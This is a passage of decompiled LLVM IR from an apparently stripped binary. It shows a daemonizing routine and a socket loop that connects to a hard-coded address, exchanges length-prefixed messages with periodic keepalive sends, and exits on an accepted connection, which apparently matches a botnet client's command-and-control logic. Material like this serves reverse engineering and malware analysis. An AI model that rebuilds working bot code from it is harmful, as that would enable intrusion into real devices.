  %v1_105b0 = load i32, i32* @r6, align 4
  %v7_105b4 = icmp sgt i32 %v0_105ac, %v1_105b0
  br i1 %v7_105b4, label %dec_label_pc_105b8, label %dec_label_pc_10628

dec_label_pc_105b8:                               ; preds = %dec_label_pc_104f0
  %v2_105c4 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_105c4, i32* %r4.global-to-local, align 4
  store i32 %v6_101d8, i32* %r5.global-to-local, align 4
  ret i32 0

dec_label_pc_105c8:                               ; preds = %dec_label_pc_101d8
  %v4_105d0 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @global_var_14418.204, i32 0, i32 0), i32 2)
  %v3_105d4 = icmp eq i32 %v4_105d0, -1
  store i32 %v4_105d0, i32* @r4, align 4
  br i1 %v3_105d4, label %dec_label_pc_1027c, label %dec_label_pc_10250

dec_label_pc_105e4:                               ; preds = %dec_label_pc_10338
  %v1_105e8 = call i32 @raise(i32 5)
  br label %dec_label_pc_104cc

dec_label_pc_105f0:                               ; preds = %dec_label_pc_104cc
  %v0_105f0 = load i32, i32* @r6, align 4
  %v1_105f0 = add i32 %v0_105f0, 4
  %v2_105f0 = inttoptr i32 %v1_105f0 to i32*
  %v3_105f0 = load i32, i32* %v2_105f0, align 4
  %v1_105f4 = inttoptr i32 %v3_105f0 to i8*
  %v2_105f4 = call i32 @function_13a54(i8* %v1_105f4)
  %v8_105fc = icmp sgt i32 %v2_105f4, 31
  br i1 %v8_105fc, label %dec_label_pc_104f0, label %dec_label_pc_10600

dec_label_pc_10600:                               ; preds = %dec_label_pc_105f0
  %v0_10600 = load i32, i32* @r6, align 4
  %v1_10600 = add i32 %v0_10600, 4
  %v2_10600 = inttoptr i32 %v1_10600 to i32*
  %v3_10600 = load i32, i32* %v2_10600, align 4
  store i32 %v2_104d0, i32* @r0, align 4
  %v2_10608 = bitcast i32* %stack_var_-138 to i8*
  %v3_10608 = call i32 @function_13a7c(i8* %v2_10608, i32 %v3_10600)
  %v0_1060c = load i32, i32* @r6, align 4
  %v1_1060c = add i32 %v0_1060c, 4
  %v2_1060c = inttoptr i32 %v1_1060c to i32*
  %v3_1060c = load i32, i32* %v2_1060c, align 4
  store i32 %v3_1060c, i32* %r4.global-to-local, align 4
  %v1_10614 = inttoptr i32 %v3_1060c to i8*
  %v2_10614 = call i32 @function_13a54(i8* %v1_10614)
  %v0_1061c = load i32, i32* %r4.global-to-local, align 4
  %v2_10620 = call i32 @function_13af4(i32 %v0_1061c, i32 %v2_10614)
  br label %dec_label_pc_104f0

dec_label_pc_10628:                               ; preds = %dec_label_pc_104f0
  %v1_10628 = call i32 @setsid()
  %v0_10630 = load i32, i32* @r6, align 4
  %v1_10634 = call i32 @close(i32 %v0_10630)
  %v1_1063c = call i32 @close(i32 1)
  %v1_10644 = call i32 @close(i32 2)
  %v2_10648 = ptrtoint i32* %stack_var_-348 to i32
  store i32 %v2_10648, i32* @r7, align 4
  %v1_1064c = call i32 @function_b2b0(i32 %v1_10644)
  store i32 ptrtoint (i32* @global_var_1cd50.206 to i32), i32* @sb, align 4
  %v1_10654 = call i32 @function_f828(i32 %v1_1064c)
  %v0_10658 = call i32 @function_11694()
  %v0_1065c = load i32, i32* @r6, align 4
  %v2_10664 = ptrtoint i32* %stack_var_-592 to i32
  store i32 %v2_10664, i32* @r6, align 4
  %v2_10668 = ptrtoint i32* %stack_var_-336 to i32
  store i32 %v2_10668, i32* @r7, align 4
  %v2_10748 = ptrtoint i32* %stack_var_-60 to i32
  %v2_109f8 = ptrtoint i8* %stack_var_-38 to i32
  %v2_1092c = ptrtoint i32* %stack_var_-1616 to i32
  %v2_10a1c = ptrtoint i32* %stack_var_-48 to i32
  %v1_10ab0 = bitcast i32* %stack_var_-138 to i8*
  %v2_10a7c = ptrtoint i32* %stack_var_-88 to i32
  br label %dec_label_pc_1066c

dec_label_pc_1066c:                               ; preds = %dec_label_pc_1066c.backedge, %dec_label_pc_10628
  %v2_1067487 = phi i32 [ %v2_10664, %dec_label_pc_10628 ], [ %v2_1067487.pre, %dec_label_pc_1066c.backedge ]
  %stack_var_-37.0 = phi i8 [ %tmp13, %dec_label_pc_10628 ], [ %stack_var_-37.0.be, %dec_label_pc_1066c.backedge ]
  %stack_var_-1620.0 = phi i32 [ %v0_1065c, %dec_label_pc_10628 ], [ %stack_var_-1620.0.be, %dec_label_pc_1066c.backedge ]
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v4_1067489 = inttoptr i32 %v2_1067487 to i32*
  store i32 0, i32* %v4_1067489, align 4
  %v0_1067890 = load i32, i32* %r3.global-to-local, align 4
  %v1_1067891 = add i32 %v0_1067890, 4
  store i32 %v1_1067891, i32* %r3.global-to-local, align 4
  %v7_1067c92 = icmp eq i32 %v1_1067891, 128
  br i1 %v7_1067c92, label %dec_label_pc_10684, label %dec_label_pc_10674.dec_label_pc_10674_crit_edge

dec_label_pc_10674.dec_label_pc_10674_crit_edge:  ; preds = %dec_label_pc_1066c, %dec_label_pc_10674.dec_label_pc_10674_crit_edge
  %v1_1067893 = phi i32 [ %v1_10678, %dec_label_pc_10674.dec_label_pc_10674_crit_edge ], [ %v1_1067891, %dec_label_pc_1066c ]
  %v0_10674.pre = load i32, i32* %r2.global-to-local, align 4
  %v2_10674 = load i32, i32* @r6, align 4
  %v3_10674 = add i32 %v2_10674, %v1_1067893
  %v4_10674 = inttoptr i32 %v3_10674 to i32*
  store i32 %v0_10674.pre, i32* %v4_10674, align 4
  %v0_10678 = load i32, i32* %r3.global-to-local, align 4
  %v1_10678 = add i32 %v0_10678, 4
  store i32 %v1_10678, i32* %r3.global-to-local, align 4
  %v7_1067c = icmp eq i32 %v1_10678, 128
  br i1 %v7_1067c, label %dec_label_pc_10684, label %dec_label_pc_10674.dec_label_pc_10674_crit_edge

dec_label_pc_10684:                               ; preds = %dec_label_pc_10674.dec_label_pc_10674_crit_edge, %dec_label_pc_1066c
  %v0_10684 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_10684, i32* %r3.global-to-local, align 4
  store i32 %v0_10684, i32* %r4.global-to-local, align 4
  %v2_1068c94 = load i32, i32* @r7, align 4
  %v3_1068c95 = add i32 %v2_1068c94, %v0_10684
  %v4_1068c96 = inttoptr i32 %v3_1068c95 to i32*
  store i32 %v0_10684, i32* %v4_1068c96, align 4
  %v0_1069097 = load i32, i32* %r3.global-to-local, align 4
  %v1_1069098 = add i32 %v0_1069097, 4
  store i32 %v1_1069098, i32* %r3.global-to-local, align 4
  %v7_1069499 = icmp eq i32 %v1_1069098, 128
  br i1 %v7_1069499, label %dec_label_pc_1069c, label %dec_label_pc_1068c.dec_label_pc_1068c_crit_edge

dec_label_pc_1068c.dec_label_pc_1068c_crit_edge:  ; preds = %dec_label_pc_10684, %dec_label_pc_1068c.dec_label_pc_1068c_crit_edge
  %v1_10690100 = phi i32 [ %v1_10690, %dec_label_pc_1068c.dec_label_pc_1068c_crit_edge ], [ %v1_1069098, %dec_label_pc_10684 ]
  %v0_1068c.pre = load i32, i32* %r4.global-to-local, align 4
  %v2_1068c = load i32, i32* @r7, align 4
  %v3_1068c = add i32 %v2_1068c, %v1_10690100
  %v4_1068c = inttoptr i32 %v3_1068c to i32*
  store i32 %v0_1068c.pre, i32* %v4_1068c, align 4
  %v0_10690 = load i32, i32* %r3.global-to-local, align 4
  %v1_10690 = add i32 %v0_10690, 4
  store i32 %v1_10690, i32* %r3.global-to-local, align 4
  %v7_10694 = icmp eq i32 %v1_10690, 128
  br i1 %v7_10694, label %dec_label_pc_1069c, label %dec_label_pc_1068c.dec_label_pc_1068c_crit_edge

dec_label_pc_1069c:                               ; preds = %dec_label_pc_1068c.dec_label_pc_1068c_crit_edge, %dec_label_pc_10684
  store i32 ptrtoint (i32* @global_var_1cd4c.166 to i32), i32* %r3.global-to-local, align 4
  %v2_106a0 = load i32, i32* @global_var_1cd4c.166, align 4
  %v7_106a4 = icmp eq i32 %v2_106a0, -1
  br i1 %v7_106a4, label %dec_label_pc_106d4, label %dec_label_pc_106ac

dec_label_pc_106ac:                               ; preds = %dec_label_pc_1069c
  %v3_106ac = udiv i32 %v2_106a0, 32
  %v3_106b4 = mul nuw nsw i32 %v3_106ac, 4
  %v2_106bc = add i32 %v3_106b4, %v2_10518
  store i32 %v2_106bc, i32* %r3.global-to-local, align 4
  %v1_106c0 = add i32 %v2_106bc, -556
  %v2_106c0 = inttoptr i32 %v1_106c0 to i32*
  %v3_106c0 = load i32, i32* %v2_106c0, align 4
  %v1_106c4 = urem i32 %v2_106a0, 32
  %v7_106cc = shl i32 1, %v1_106c4
  %v8_106cc = or i32 %v3_106c0, %v7_106cc
  store i32 %v8_106cc, i32* %r2.global-to-local, align 4
  store i32 %v8_106cc, i32* %v2_106c0, align 4
  br label %dec_label_pc_106d4

dec_label_pc_106d4:                               ; preds = %dec_label_pc_1069c, %dec_label_pc_106ac
  %v2_106d4 = load i32, i32* @global_var_1cd50.206, align 4
  store i32 %v2_106d4, i32* %r3.global-to-local, align 4
  %v7_106d8 = icmp eq i32 %v2_106d4, -1
  store i32 ptrtoint (i32* @global_var_1cd50.206 to i32), i32* @r8, align 4
  br i1 %v7_106d8, label %dec_label_pc_1097c, label %dec_label_pc_106e4

dec_label_pc_106e4:                               ; preds = %dec_label_pc_1097c, %dec_label_pc_106d4, %.thread
  store i32 ptrtoint (i8** @global_var_1cda8.209 to i32), i32* %r2.global-to-local, align 4
  %v2_106e8 = load i8, i8* bitcast (i8** @global_var_1cda8.209 to i8*), align 4
  %v3_106e8 = zext i8 %v2_106e8 to i32
  store i32 %v3_106e8, i32* %r3.global-to-local, align 4
  %v2_106ec = icmp eq i8 %v2_106e8, 0
  %v2_1083c = load i32, i32* @global_var_1cd50.206, align 4
  %v3_10844 = udiv i32 %v2_1083c, 32
  br i1 %v2_106ec, label %dec_label_pc_1083c, label %dec_label_pc_106f4

dec_label_pc_106f4:                               ; preds = %dec_label_pc_106e4
  %v3_10700 = mul nuw nsw i32 %v3_10844, 4
  %v2_10708 = add i32 %v3_10700, %v2_10518
  store i32 %v2_10708, i32* %r3.global-to-local, align 4
  %v1_1070c = add i32 %v2_10708, -300
  %v2_1070c = inttoptr i32 %v1_1070c to i32*
  %v3_1070c = load i32, i32* %v2_1070c, align 4
  %v1_10710 = urem i32 %v2_1083c, 32
  %v7_10718 = shl i32 1, %v1_10710
  %v8_10718 = or i32 %v3_1070c, %v7_10718
  store i32 %v8_10718, i32* %r2.global-to-local, align 4
  store i32 %v8_10718, i32* %v2_1070c, align 4
  br label %dec_label_pc_10720

dec_label_pc_10720:                               ; preds = %dec_label_pc_1083c, %dec_label_pc_106f4
  %v2_10724 = load i32, i32* @global_var_1cd4c.166, align 4
  %v2_10728 = load i32, i32* @global_var_1cd50.206, align 4
  store i32 %v2_10728, i32* %r3.global-to-local, align 4
  store i32 0, i32* @lr, align 4
  %v5_10734 = icmp slt i32 %v2_10724, %v2_10728
  br i1 %v5_10734, label %bb, label %bb84

bb:                                               ; preds = %dec_label_pc_10720
  br label %bb84

bb84:                                             ; preds = %dec_label_pc_10720, %bb
  %v0_10744 = phi i32 [ %v2_10724, %dec_label_pc_10720 ], [ %v2_10728, %bb ]
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 10, i32* %stack_var_-60, align 4
  %v1_10744 = add i32 %v0_10744, 1
  store i32 %v2_10668, i32* %r2.global-to-local, align 4
  %v5_1075c = call i32 @_select(i32 %v1_10744, i32 %v2_10664, i32 %v2_10668, i32 0, i32 %v2_10748)
  %v8_10760 = icmp eq i32 %v5_1075c, -1
  store i32 %v5_1075c, i32* %r3.global-to-local, align 4
  br i1 %v8_10760, label %dec_label_pc_1066c.backedge, label %dec_label_pc_1076c

dec_label_pc_1076c:                               ; preds = %bb84
  %v6_1075c = trunc i32 %v5_1075c to i8
  %v3_1076c = icmp eq i8 %v6_1075c, 0
  br i1 %v3_1076c, label %dec_label_pc_10774, label %dec_label_pc_1079c

dec_label_pc_10774:                               ; preds = %dec_label_pc_1076c
  store i8 0, i8* %stack_var_-38, align 1
  %v2_10784 = srem i32 %stack_var_-1620.0, 6
  %v2_1078c = icmp eq i32 %v2_10784, 0
  %v1_10790 = add i32 %stack_var_-1620.0, 1
  store i32 %v1_10790, i32* %r2.global-to-local, align 4
  br i1 %v2_1078c, label %dec_label_pc_109ec, label %dec_label_pc_1079c

dec_label_pc_1079c:                               ; preds = %dec_label_pc_1076c, %dec_label_pc_10774, %dec_label_pc_109ec
  %stack_var_-37.1 = phi i8 [ 0, %dec_label_pc_109ec ], [ 0, %dec_label_pc_10774 ], [ %stack_var_-37.0, %dec_label_pc_1076c ]
  %stack_var_-1620.1 = phi i32 [ %v1_10790, %dec_label_pc_109ec ], [ %v1_10790, %dec_label_pc_10774 ], [ %stack_var_-1620.0, %dec_label_pc_1076c ]
  store i32 ptrtoint (i32* @global_var_1cd4c.166 to i32), i32* %r3.global-to-local, align 4
  %v2_107a0 = load i32, i32* @global_var_1cd4c.166, align 4
  %v7_107a4 = icmp eq i32 %v2_107a0, -1
  br i1 %v7_107a4, label %dec_label_pc_107d4, label %dec_label_pc_107ac

dec_label_pc_107ac:                               ; preds = %dec_label_pc_1079c
  %v3_107ac = udiv i32 %v2_107a0, 32
  %v3_107b4 = mul nuw nsw i32 %v3_107ac, 4
  %v2_107bc = add i32 %v3_107b4, %v2_10518
  store i32 %v2_107bc, i32* %r3.global-to-local, align 4
  %v1_107c0 = add i32 %v2_107bc, -556
  %v2_107c0 = inttoptr i32 %v1_107c0 to i32*
  %v3_107c0 = load i32, i32* %v2_107c0, align 4
  %v1_107c4 = urem i32 %v2_107a0, 32
  %v6_107c8 = lshr i32 %v3_107c0, %v1_107c4
  store i32 %v6_107c8, i32* %r2.global-to-local, align 4
  %v1_107cc = urem i32 %v6_107c8, 2
  %v2_107cc = icmp eq i32 %v1_107cc, 0
  store i1 %v2_107cc, i1* @cpsr_z, align 1
  br i1 %v2_107cc, label %dec_label_pc_107d4, label %dec_label_pc_10a6c

dec_label_pc_107d4:                               ; preds = %dec_label_pc_107ac, %dec_label_pc_1079c
  store i32 ptrtoint (i8** @global_var_1cda8.209 to i32), i32* %r3.global-to-local, align 4
  %v2_107d8 = load i8, i8* bitcast (i8** @global_var_1cda8.209 to i8*), align 4
  %v3_107d8 = zext i8 %v2_107d8 to i32
  store i32 %v3_107d8, i32* %r4.global-to-local, align 4
  %v2_107dc = icmp eq i8 %v2_107d8, 0
  %v2_1086c = load i32, i32* @global_var_1cd50.206, align 4
  br i1 %v2_107dc, label %dec_label_pc_1086c, label %dec_label_pc_107e4

dec_label_pc_107e4:                               ; preds = %dec_label_pc_107d4
  %v3_107ec = udiv i32 %v2_1086c, 32
  %v3_107f4 = mul nuw nsw i32 %v3_107ec, 4
  %v2_107f8 = add i32 %v3_107f4, %v2_10518
  store i32 %v2_107f8, i32* %r3.global-to-local, align 4
  %v1_107fc = add i32 %v2_107f8, -300
  %v2_107fc = inttoptr i32 %v1_107fc to i32*
  %v3_107fc = load i32, i32* %v2_107fc, align 4
  %v1_10800 = urem i32 %v2_1086c, 32
  %v6_10804 = lshr i32 %v3_107fc, %v1_10800
  store i32 %v6_10804, i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i8** @global_var_1cda8.209 to i32), i32* %r3.global-to-local, align 4
  %v1_10810 = urem i32 %v6_10804, 2
  %v2_10810 = icmp eq i32 %v1_10810, 0
  store i8 0, i8* bitcast (i8** @global_var_1cda8.209 to i8*), align 4
  store i32 ptrtoint (i32* @global_var_1cd50.206 to i32), i32* @r5, align 4
  br i1 %v2_10810, label %dec_label_pc_10820, label %dec_label_pc_10a0c

dec_label_pc_10820:                               ; preds = %dec_label_pc_107e4
  %v1_10824 = icmp ne i32 %v2_1086c, -1
  call void @__pseudo_cond_branch(i1 %v1_10824, i32 ptrtoint (i32* @global_var_8dcc.81 to i32))
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_1082c = load i32, i32* @r5, align 4
  %v2_1082c = inttoptr i32 %v1_1082c to i32*
  store i32 -1, i32* %v2_1082c, align 4
  %v1_10834 = call i32 @_sleep(i32 1)
  br label %dec_label_pc_1066c.backedge

dec_label_pc_1066c.backedge:                      ; preds = %dec_label_pc_10820, %dec_label_pc_10958, %dec_label_pc_10a44, %dec_label_pc_10af8, %dec_label_pc_10b20, %dec_label_pc_10b90, %bb84, %dec_label_pc_1086c, %dec_label_pc_1087c, %dec_label_pc_10aac, %bb86, %dec_label_pc_10b3c, %dec_label_pc_10b0c
  %stack_var_-37.0.be = phi i8 [ %stack_var_-37.0, %bb84 ], [ %stack_var_-37.1, %dec_label_pc_1086c ], [ %stack_var_-37.1, %dec_label_pc_1087c ], [ %stack_var_-37.3, %bb86 ], [ %stack_var_-37.2, %dec_label_pc_10958 ], [ %stack_var_-37.1, %dec_label_pc_10b20 ], [ %v3_10b54, %dec_label_pc_10b3c ], [ %v3_10b54, %dec_label_pc_10b90 ], [ %stack_var_-37.1, %dec_label_pc_10820 ], [ %stack_var_-37.1, %dec_label_pc_10aac ], [ %stack_var_-37.1, %dec_label_pc_10af8 ], [ %stack_var_-37.1, %dec_label_pc_10a44 ], [ %stack_var_-37.3, %dec_label_pc_10b0c ]
  %stack_var_-1620.0.be = phi i32 [ %stack_var_-1620.0, %bb84 ], [ %stack_var_-1620.1, %dec_label_pc_1086c ], [ %stack_var_-1620.1, %dec_label_pc_1087c ], [ %stack_var_-1620.1, %bb86 ], [ %stack_var_-1620.1, %dec_label_pc_10958 ], [ %stack_var_-1620.1, %dec_label_pc_10b20 ], [ %stack_var_-1620.1, %dec_label_pc_10b3c ], [ %stack_var_-1620.1, %dec_label_pc_10b90 ], [ %stack_var_-1620.1, %dec_label_pc_10820 ], [ %stack_var_-1620.1, %dec_label_pc_10aac ], [ %stack_var_-1620.1, %dec_label_pc_10af8 ], [ %stack_var_-1620.1, %dec_label_pc_10a44 ], [ %stack_var_-1620.1, %dec_label_pc_10b0c ]
  %v2_1067487.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_1066c

dec_label_pc_1083c:                               ; preds = %dec_label_pc_106e4
  store i32 %v2_10518, i32* %r2.global-to-local, align 4
  %v3_1084c = mul nuw nsw i32 %v3_10844, 4
  %v2_10850 = add i32 %v3_1084c, %v2_10518
  store i32 %v2_10850, i32* %r3.global-to-local, align 4
  %v1_10854 = add i32 %v2_10850, -556
  %v2_10854 = inttoptr i32 %v1_10854 to i32*
  %v3_10854 = load i32, i32* %v2_10854, align 4
  %v1_10858 = urem i32 %v2_1083c, 32
  %v7_10860 = shl i32 1, %v1_10858
  %v8_10860 = or i32 %v3_10854, %v7_10860
  store i32 %v8_10860, i32* %r2.global-to-local, align 4
  store i32 %v8_10860, i32* %v2_10854, align 4
  br label %dec_label_pc_10720

dec_label_pc_1086c:                               ; preds = %dec_label_pc_107d4
  %v7_10870 = icmp eq i32 %v2_1086c, -1
  store i32 ptrtoint (i32* @global_var_1cd50.206 to i32), i32* @r5, align 4
  br i1 %v7_10870, label %dec_label_pc_1066c.backedge, label %dec_label_pc_1087c

dec_label_pc_1087c:                               ; preds = %dec_label_pc_1086c
  %v3_1087c = udiv i32 %v2_1086c, 32
  store i32 %v2_10518, i32* %r2.global-to-local, align 4
  %v3_10888 = mul nuw nsw i32 %v3_1087c, 4
  %v2_1088c = add i32 %v3_10888, %v2_10518
  store i32 %v2_1088c, i32* %r3.global-to-local, align 4
  %v1_10890 = add i32 %v2_1088c, -556
  %v2_10890 = inttoptr i32 %v1_10890 to i32*
  %v3_10890 = load i32, i32* %v2_10890, align 4
  %v1_10894 = urem i32 %v2_1086c, 32
  %v6_10898 = lshr i32 %v3_10890, %v1_10894
  store i32 %v6_10898, i32* %r2.global-to-local, align 4
  %v1_1089c = urem i32 %v6_10898, 2
  %v2_1089c = icmp eq i32 %v1_1089c, 0
  br i1 %v2_1089c, label %dec_label_pc_1066c.backedge, label %dec_label_pc_108a4

dec_label_pc_108a4:                               ; preds = %dec_label_pc_1087c
  %v0_108a4 = call i32* @__errno_location()
  %v1_108a4 = ptrtoint i32* %v0_108a4 to i32
  %v0_108a8 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_108a8, i32* %v0_108a4, align 4
  store i32 %v1_108a4, i32* @r8, align 4
  store i32 16386, i32* %r3.global-to-local, align 4
  %v2_108bc = load i32, i32* @global_var_1cd50.206, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v4_108c8 = call i32 @_recv(i32 %v2_108bc, i32 %v2_109f8, i32 2, i32 16386)
  %v7_108cc = icmp eq i32 %v4_108c8, -1
  br i1 %v7_108cc, label %dec_label_pc_10b0c, label %dec_label_pc_108d4

dec_label_pc_108d4:                               ; preds = %dec_label_pc_108a4
  %v2_108d4 = icmp eq i32 %v4_108c8, 0
  br i1 %v2_108d4, label %dec_label_pc_10958, label %dec_label_pc_108dc

dec_label_pc_108dc:                               ; preds = %dec_label_pc_108d4
  %v3_108dc = load i8, i8* %stack_var_-38, align 1
  %v4_108dc = sext i8 %v3_108dc to i32
  %v4_108e0 = zext i8 %stack_var_-37.1 to i32
  store i32 %v4_108e0, i32* %r3.global-to-local, align 4
  %v4_108e4 = mul nuw nsw i32 %v4_108e0, 256
  %v5_108e4 = or i32 %v4_108dc, %v4_108e4
  store i32 %v5_108e4, i32* %r2.global-to-local, align 4
  %v7_108e4 = icmp eq i32 %v5_108e4, 0
  br i1 %v7_108e4, label %dec_label_pc_10b20, label %dec_label_pc_108ec

dec_label_pc_108ec:                               ; preds = %dec_label_pc_108dc
  %v1_108ec = mul nsw i32 %v4_108dc, 256
  %v3_108f0 = and i32 %v1_108ec, 65280
  %v4_108f4 = udiv i32 %v5_108e4, 256
  %v5_108f4 = or i32 %v3_108f0, %v4_108f4
  store i32 %v5_108f4, i32* %r3.global-to-local, align 4
  %v3_108f84 = udiv i32 %v5_108f4, 256
  store i32 %v3_108f84, i32* %r2.global-to-local, align 4
  %v1_10900 = trunc i32 %v3_108f84 to i8
  %v6_10904 = trunc i32 %v4_108f4 to i8
  store i8 %v6_10904, i8* %stack_var_-38, align 1
  %tmp103 = icmp ult i32 %v5_108f4, 1025
  br i1 %tmp103, label %dec_label_pc_1091c, label %dec_label_pc_1090c

dec_label_pc_1090c:                               ; preds = %dec_label_pc_108ec
  %v2_1090c = load i32, i32* @global_var_1cd50.206, align 4
  %v1_10910 = call i32 @close(i32 %v2_1090c)
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_10918 = load i32, i32* @r5, align 4
  %v2_10918 = inttoptr i32 %v1_10918 to i32*
  store i32 -1, i32* %v2_10918, align 4
  %v3_10924.pre = load i8, i8* %stack_var_-38, align 1
  br label %dec_label_pc_1091c

dec_label_pc_1091c:                               ; preds = %dec_label_pc_108ec, %dec_label_pc_1090c
  %v3_10924 = phi i8 [ %v6_10904, %dec_label_pc_108ec ], [ %v3_10924.pre, %dec_label_pc_1090c ]
  %v0_1091c = load i32, i32* %r4.global-to-local, align 4
  %v1_1091c = load i32, i32* @r8, align 4
  %v2_1091c = inttoptr i32 %v1_1091c to i32*
  store i32 %v0_1091c, i32* %v2_1091c, align 4
  %v4_10920 = urem i32 %v3_108f84, 256
  %v4_10924 = sext i8 %v3_10924 to i32
  store i32 %v2_1092c, i32* @r4, align 4
  %v4_10934 = mul nuw nsw i32 %v4_10920, 256
  %v5_10934 = or i32 %v4_10924, %v4_10934
  store i32 %v5_10934, i32* %r2.global-to-local, align 4
  store i32 16386, i32* %r3.global-to-local, align 4
  %v2_1093c = load i32, i32* @global_var_1cd50.206, align 4
  %v4_10944 = call i32 @_recv(i32 %v2_1093c, i32 %v2_1092c, i32 %v5_10934, i32 16386)
  %v7_10948 = icmp eq i32 %v4_10944, -1
  br i1 %v7_10948, label %dec_label_pc_10b0c, label %dec_label_pc_10950

dec_label_pc_10950:                               ; preds = %dec_label_pc_1091c
  %v2_10950 = icmp eq i32 %v4_10944, 0
  br i1 %v2_10950, label %dec_label_pc_10958, label %dec_label_pc_10b3c

dec_label_pc_10958:                               ; preds = %bb86, %dec_label_pc_10950, %dec_label_pc_108d4
  %stack_var_-37.2 = phi i8 [ %stack_var_-37.3, %bb86 ], [ %stack_var_-37.1, %dec_label_pc_108d4 ], [ %v1_10900, %dec_label_pc_10950 ]
  %v2_10958 = load i32, i32* @global_var_1cd50.206, align 4
  %v1_10960 = icmp ne i32 %v2_10958, -1
  call void @__pseudo_cond_branch(i1 %v1_10960, i32 ptrtoint (i32* @global_var_8dcc.81 to i32))
  store i32 ptrtoint (i32* @global_var_1cd50.206 to i32), i32* %r3.global-to-local, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  store i32 -1, i32* @global_var_1cd50.206, align 4
  %v1_10974 = call i32 @_sleep(i32 1)
  br label %dec_label_pc_1066c.backedge

dec_label_pc_1097c:                               ; preds = %dec_label_pc_106d4
  %v0_10984 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_10984, i32* %r2.global-to-local, align 4
  %v3_10988 = call i32 @_socket(i32 2, i32 1, i32 %v0_10984)
  %v7_1098c = icmp eq i32 %v3_10988, -1
  store i32 %v3_10988, i32* %r5.global-to-local, align 4
  %v1_10994 = load i32, i32* @r8, align 4
  %v2_10994 = inttoptr i32 %v1_10994 to i32*
  store i32 %v3_10988, i32* %v2_10994, align 4
  br i1 %v7_1098c, label %dec_label_pc_106e4, label %dec_label_pc_1099c

dec_label_pc_1099c:                               ; preds = %dec_label_pc_1097c
  %v0_1099c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_1099c, i32* %r2.global-to-local, align 4
  %v2_109a4 = call i32 (i32, i32, ...) @fcntl(i32 %v3_10988, i32 3)
  %v1_109ac = or i32 %v2_109a4, 2048
  store i32 %v1_109ac, i32* %r2.global-to-local, align 4
  %v0_109b0 = load i32, i32* %r5.global-to-local, align 4
  %v2_109b4 = call i32 (i32, i32, ...) @fcntl(i32 %v0_109b0, i32 4)
  %v2_109bc = load i32, i32* @global_var_1cd54.164, align 4
  store i32 %v2_109bc, i32* %r3.global-to-local, align 4
  %v2_109c0 = icmp eq i32 %v2_109bc, 0
  br i1 %v2_109c0, label %.thread, label %bb85

bb85:                                             ; preds = %dec_label_pc_1099c
  call void @__pseudo_branch(i32 ptrtoint (i32* @global_var_13d0c.211 to i32))
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_1099c, %bb85
  store i32 1, i32* %r3.global-to-local, align 4
  %v2_109d4 = load i32, i32* @global_var_1cd50.206, align 4
  store i32 %v2_109d4, i32* @r0, align 4
  store i32 ptrtoint (i8** @global_var_1ce00.171 to i32), i32* @r1, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  store i8 1, i8* bitcast (i8** @global_var_1cda8.209 to i8*), align 4
  %v4_109e4 = call i32 @_connect(i32 %v2_109d4, i32 ptrtoint (i8** @global_var_1ce00.171 to i32), i32 16)
  br label %dec_label_pc_106e4

dec_label_pc_109ec:                               ; preds = %dec_label_pc_10774
  %v2_109f4 = load i32, i32* @global_var_1cd50.206, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v5_10a04 = call i32 @_send(i32 %v2_109f4, i32 %v2_109f8, i32 2, i32 16384)
  br label %dec_label_pc_1079c

dec_label_pc_10a0c:                               ; preds = %dec_label_pc_107e4
  store i32 4, i32* @r4, align 4
  store i32 0, i32* %stack_var_-48, align 4
  store i32 %v2_10a1c, i32* %r3.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 4, i32* %stack_var_-52, align 4
  %v7_10a34 = call i32 @getsockopt(i32 %v2_1086c, i32 1, i32 4, i32* nonnull %stack_var_-48, i32* nonnull %stack_var_-52)
  %v3_10a38 = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_10a38, i32* %r3.global-to-local, align 4
  %v2_10a3c = icmp eq i32 %v3_10a38, 0
  br i1 %v2_10a3c, label %dec_label_pc_10aac, label %dec_label_pc_10a44

dec_label_pc_10a44:                               ; preds = %dec_label_pc_10a0c
  %v2_10a44 = load i32, i32* @global_var_1cd50.206, align 4
  %v1_10a48 = call i32 @close(i32 %v2_10a44)
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_10a50 = load i32, i32* @r5, align 4
  %v2_10a50 = inttoptr i32 %v1_10a50 to i32*
  store i32 -1, i32* %v2_10a50, align 4
  %v0_10a54 = call i32 @function_10bd8()
  %v2_10a5c = urem i32 %v0_10a54, 10
  %v1_10a60 = add nuw nsw i32 %v2_10a5c, 1
  %v1_10a64 = call i32 @_sleep(i32 %v1_10a60)
  br label %dec_label_pc_1066c.backedge

dec_label_pc_10a6c:                               ; preds = %dec_label_pc_107ac
  store i32 16, i32* %r3.global-to-local, align 4
  store i32 %v2_10a1c, i32* %r2.global-to-local, align 4
  store i32 16, i32* %stack_var_-48, align 4
  %v5_10a84 = call i32 @_accept(i32 %v2_107a0, i32 %v2_10a7c, i32 %v2_10a1c, i32 16, i32 16)
  %v1_10a88 = call i32 @function_11408(i32 %v5_10a84)
  %v1_10a8c = call i32 @function_f2a8(i32 %v1_10a88)
  %v1_10a90 = call i32 @function_b084(i32 %v1_10a8c)
  store i32 %v1_10628, i32* %r2.global-to-local, align 4
  %v0_10aa0 = call i32 @_kill()
  call void @exit(i32 0)
  unreachable

dec_label_pc_10aac:                               ; preds = %dec_label_pc_10a0c
  %v2_10ab0 = call i32 @function_13a54(i8* %v1_10ab0)
  %v3_10ab0 = trunc i32 %v2_10ab0 to i8
  store i8 %v3_10ab0, i8* %stack_var_-38, align 1
